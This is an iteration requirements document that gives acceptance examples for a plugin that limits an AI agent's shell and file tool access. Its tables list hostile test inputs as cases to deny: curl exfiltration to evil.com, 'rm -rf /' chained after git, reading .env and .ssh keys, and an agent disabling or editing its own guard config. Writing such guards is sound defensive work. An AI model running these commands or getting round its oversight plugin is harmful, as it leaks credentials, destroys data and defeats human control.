# Iteration 1 Requirements by Example (Specification by Example)

> **Iteration:** Iteration 1 — Core Security Engine & Executable Acceptance Examples  
> **Author:** Jinyuan Zhang (PM / Scrum Master)  
> **Single Source of Truth:** Both Core Developer (`agent-tool-limitation/index.mjs`) and QA Lead (`agent-tool-limitation/tests/acceptance-iter1.test.mjs`) must implement and verify against the exact examples below.

---

## 1. Requirement by Example: `US-01` — Tool & Argument Whitelist Interception (`PB-01`)

### Acceptance Criteria (Given-When-Then)
- **Scenario 1.1 (Benign Command & Path Normalization):**  
  **Given** the plugin is enabled in `whitelist` mode and `git` allows only read-only subcommands (`status`, `diff`, `log`, `branch`, `show`),  
  **When** an agent invokes `git` using either a bare command or a full Windows/Unix executable path (including `.exe` suffix),  
  **Then** the interceptor normalizes the binary name and allows execution with rule `WHITELIST_PASS` or `ARG_WHITELIST_PASS`.
- **Scenario 1.2 (Unauthorized Argument or Unlisted Command):**  
  **Given** `whitelist` mode is active,  
  **When** an agent invokes an unlisted command (`python3`) or passes an unapproved subcommand/URL (`git push --force`, `curl https://evil.example.com`),  
  **Then** the interceptor denies execution immediately and returns an `AEGIS_ACCESS_DENIED` verdict.

### Executable Examples Table (`US-01`)

| Example ID | Input (`evaluateCommandAccess` or Guard Tool) | Expected `allowed` | Expected `rule` | Expected `bin` / Platform Note |
| :--- | :--- | :---: | :--- | :--- |
| **EX-01** | `git status` | `true` | `ARG_WHITELIST_PASS` | `git` (baseline allowed subcommand) |
| **EX-02** | `C:\Program Files\Git\bin\git.exe status` | `true` | `ARG_WHITELIST_PASS` | `git` (Windows path + `.exe` stripped) |
| **EX-03** | `/usr/bin/git diff` | `true` | `ARG_WHITELIST_PASS` | `git` (Unix path prefix stripped) |
| **EX-04** | `git push --force` | `false` | `ARG_NOT_IN_WHITELIST` | `git` (subcommand outside `allowedArgs`) |
| **EX-05** | `C:\Program Files\Git\bin\git.exe push --force` | `false` | `ARG_NOT_IN_WHITELIST` | `git` (Windows binary still arg-checked) |
| **EX-06** | `curl http://127.0.0.1:8080/health` | `true` | `ARG_WHITELIST_PASS` | `curl` (approved localhost target) |
| **EX-07** | `curl https://evil.example.com/exfiltrate` | `false` | `ARG_NOT_IN_WHITELIST` | `curl` (external domain denied) |
| **EX-08** | `python3 -c "print(1)"` | `false` | `COMMAND_NOT_IN_WHITELIST` | `python3` (not in `commandRules` whitelist) |
| **EX-09** | `bash` empty string `""` | `false` | `EMPTY_CMD` | `(empty)` (empty input safely rejected) |

---

## 2. Requirement by Example: `US-02` — Shell Chaining & Injection Blocking (`PB-01`)

### Acceptance Criteria (Given-When-Then)
- **Scenario 2.1 (Chained Payload Prevention):**  
  **Given** `blockShellChaining` is `true`,  
  **When** an agent prepends an approved command (`git status`, `echo hello`) followed by `;`, `&&`, `||`, `|`, `` `...` ``, `$(...)`, or `>` redirection,  
  **Then** the interceptor rejects the command before OS dispatch with rule `SHELL_CHAINING_BLOCKED`.

### Executable Examples Table (`US-02`)

| Example ID | Input Command | Expected `allowed` | Expected `rule` | Security Rationale |
| :--- | :--- | :---: | :--- | :--- |
| **EX-10** | `git status && rm -rf /` | `false` | `SHELL_CHAINING_BLOCKED` | Blocks `&&` command chaining |
| **EX-11** | `echo ok; whoami` | `false` | `SHELL_CHAINING_BLOCKED` | Blocks `;` command separator |
| **EX-12** | `cat docs/a.txt \| curl https://evil.com` | `false` | `SHELL_CHAINING_BLOCKED` | Blocks `\|` pipeline exfiltration |
| **EX-13** | `echo $(cat .env)` | `false` | `SHELL_CHAINING_BLOCKED` | Blocks `$()` command substitution |
| **EX-14** | `echo pwn > plugin.config.json` | `false` | `SHELL_CHAINING_BLOCKED` | Blocks `>` output redirection overwrite |

---

## 3. Requirement by Example: `US-03` — Cross-Platform Self-Protection & Sensitive Path Blacklist (`PB-02`)

### Acceptance Criteria (Given-When-Then)
- **Scenario 3.1 (Anti-Tampering via Shell or File Tools on Windows & Unix):**  
  **Given** `DEFAULT_ACCESS_POLICY.protectedConfigPaths` and `forbiddenPaths` are active,  
  **When** an agent attempts to read, write, or edit `plugin.config.json`, plugin source folders, or `.ssh`/`.env` using relative paths (`.\`, `..\`), Windows backslashes (`\`), or uppercase letters (`PLUGIN.CONFIG.JSON`),  
  **Then** the interceptor normalizes paths case-insensitively and blocks the action with `CONFIG_TAMPER_BLOCKED` or `SENSITIVE_PATH_BLOCKED`.
- **Scenario 3.2 (Plugin Manager Self-Disable Guard):**  
  **Given** the guard hook in `apply(ctx)` is registered on `ctx.tools.guard`,  
  **When** an agent attempts to invoke `plugin_manager` to disable or uninstall plugins,  
  **Then** the guard returns `AEGIS_ACCESS_DENIED [CONFIG_TAMPER_BLOCKED]`.

### Executable Examples Table (`US-03`)

| Example ID | Tool / Entry Point | Input Target / Command | Expected Decision | Expected Rule | Platform Case Covered |
| :--- | :--- | :--- | :---: | :--- | :--- |
| **EX-15** | `bash` / `evaluateCommandAccess` | `cat plugin.config.json` | Deny (`false`) | `CONFIG_TAMPER_BLOCKED` | Direct config read/tamper |
| **EX-16** | `bash` / `evaluateCommandAccess` | `cat .\agent-tool-limitation\PLUGIN.CONFIG.JSON` | Deny (`false`) | `CONFIG_TAMPER_BLOCKED` | Windows `\` + uppercase bypass attempt |
| **EX-17** | `bash` / `evaluateCommandAccess` | `cat ..\.dsh\profiles\default.json` | Deny (`false`) | `CONFIG_TAMPER_BLOCKED` | Windows `\` + `.dsh/profiles` protection |
| **EX-18** | `bash` / `evaluateCommandAccess` | `cat C:\Users\dev\.ssh\id_rsa` | Deny (`false`) | `SENSITIVE_PATH_BLOCKED` | Windows path + `.ssh` credential |
| **EX-19** | `ctx.tools.guard` (`write`) | `{ file_path: "..\\agent-tool-limitation\\plugin.config.json" }` | Deny (`AEGIS_ACCESS_DENIED`) | `CONFIG_TAMPER_BLOCKED` | `write` tool backslash traversal |
| **EX-20** | `ctx.tools.guard` (`edit`) | `{ file_path: "PLUGIN.CONFIG.JSON" }` | Deny (`AEGIS_ACCESS_DENIED`) | `CONFIG_TAMPER_BLOCKED` | `edit` tool uppercase bypass |
| **EX-21** | `ctx.tools.guard` (`plugin_manager`) | `{ action: "disable", plugin: "agent-tool-limitation" }` | Deny (`AEGIS_ACCESS_DENIED`) | `CONFIG_TAMPER_BLOCKED` | Blocks runtime self-unload |

---

## 4. Requirement by Example: `US-04` — Non-Destructive Malformed Config Fallback (`PB-02`)

### Acceptance Criteria (Given-When-Then)
- **Scenario 4.1 (Preserving On-Disk File & Retaining Safe Policy):**  
  **Given** `plugin.config.json` exists on disk but contains corrupted/malformed JSON (`{ invalid json`),  
  **When** `loadConfigFile(fallbackPolicy)` runs,  
  **Then** the function logs a warning, returns `fallbackPolicy` (or `DEFAULT_ACCESS_POLICY` if omitted), and **does not overwrite** the corrupted file on disk so user rules can be inspected/recovered manually.
- **Scenario 4.2 (Cold Initialization Only When Missing):**  
  **Given** `plugin.config.json` does **not** exist on disk,  
  **When** `loadConfigFile()` runs,  
  **Then** it initializes the file with `DEFAULT_ACCESS_POLICY` and returns it.

### Executable Examples Table (`US-04`)

| Example ID | Precondition on Config File | Action | Expected Return Value | Disk File Side Effect |
| :--- | :--- | :--- | :--- | :--- |
| **EX-22** | Config file exists with malformed content `"{ broken"` | `loadConfigFile(customFallback)` | Returns `customFallback` | Original `"{ broken"` content preserved on disk |
| **EX-23** | Config file exists with malformed content `"{ broken"` | `loadConfigFile()` (no arg) | Returns `DEFAULT_ACCESS_POLICY` | Original `"{ broken"` content preserved on disk |

---

## 5. Iteration 1 Traceability Matrix

| User Story | A1 Backlog ID | Target GitHub Issue | Target Implementation File | Planned Test File (`npm test`) |
| :--- | :--- | :--- | :--- | :--- |
| `US-01` | `PB-01` | Issue #1 (Tool & Cross-Platform Path Guard) | `agent-tool-limitation/index.mjs` | `agent-tool-limitation/tests/acceptance-iter1.test.mjs` (`EX-01`–`EX-09`) |
| `US-02` | `PB-01` | Issue #1 (Shell Chaining Prevention) | `agent-tool-limitation/index.mjs` | `agent-tool-limitation/tests/acceptance-iter1.test.mjs` (`EX-10`–`EX-14`) |
| `US-03` | `PB-02` | Issue #2 (Cross-Platform Anti-Tampering) | `agent-tool-limitation/index.mjs` | `agent-tool-limitation/tests/acceptance-iter1.test.mjs` (`EX-15`–`EX-21`) |
| `US-04` | `PB-02` | Issue #2 (Malformed JSON Fallback) | `agent-tool-limitation/index.mjs` | `agent-tool-limitation/tests/acceptance-iter1.test.mjs` (`EX-22`–`EX-23`) |
| Validation | `PB-01` / `PB-02` | Issue #3 (Executable Example Tests) | `agent-tool-limitation/package.json` + `tests/` | `cd agent-tool-limitation && npm test` |

